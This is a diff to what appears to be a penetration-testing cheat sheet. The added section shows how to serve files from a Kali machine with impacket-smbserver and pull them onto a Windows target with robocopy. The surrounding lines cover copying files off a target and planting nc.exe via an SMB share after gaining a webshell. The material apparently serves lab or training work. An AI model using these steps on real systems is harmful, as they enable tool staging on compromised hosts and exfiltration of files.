@@ -225,6 +225,16 @@ copy $FILEPATH\file \\$LOST\ShareName
 ```
 File should be copied from remote Windows target to local Kali machine at $(pwd)
 
+### From local Kali to remote Windows target using impacket-smbserver
+On local Kali machine:
+```
+sudo impacket-smbserver ShareName $(pwd)
+```
+Copy files from local Kali machine to remote Windows target
+```
+robocopy \\<IP>\$SHARENAME\$FILENAME .
+```
+
 
 Trick: if accquired a webshell, aka have code exec, however, powershell commands don't seem to work and the target machine doesn't have nc. You can upload nc.exe via creating a SMB Share.\
 On local kali machine, create an SMB share pointing to current directory:
